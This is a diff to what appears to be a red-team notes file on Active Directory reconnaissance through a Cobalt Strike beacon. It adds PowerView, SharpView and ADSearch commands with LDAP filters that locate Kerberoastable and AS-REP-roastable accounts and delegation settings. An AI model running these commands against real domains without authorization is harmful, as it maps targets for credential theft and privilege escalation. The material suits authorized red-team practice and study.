@@ -85,6 +85,36 @@
     beacon> powerpick Find-LocalAdminAccess
     beacon> powerpick Invoke-CheckLocalAdminAccess -ComputerName <server_fqdn>
 
-beacon> powerpick Invoke-UserHunter
-beacon> powerpick Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>
-beacon> powerpick Find-WMILocalAdminAccess -ComputerName <server_fqdn>
+    beacon> powerpick Invoke-UserHunter
+    beacon> powerpick Find-PSRemotingLocalAdminAccess -ComputerName <server_fqdn>
+    beacon> powerpick Find-WMILocalAdminAccess -ComputerName <server_fqdn>
+
+# SharpView binary
+
+    beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Release\SharpView.exe Get-Domain
+
+# Domain Recon (ADSearch)
+
+    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "objectCategory=user"
+
+    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins*))"
+
+    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=group)(cn=MS SQL Admins))" --attributes cn,member
+
+# Kerberostable Users
+
+    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes cn,servicePrincipalName,samAccountName
+
+# ASEPROAST
+
+    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes cn,distinguishedname,samaccountname
+
+# Unconstrained Delegation
+
+    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname
+
+# Constrained Delegation
+
+    beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes dnshostname,samaccountname,msds-allowedtodelegateto --json
+
+# Additionally, the `--json` parameter can be used to format the output in JSON
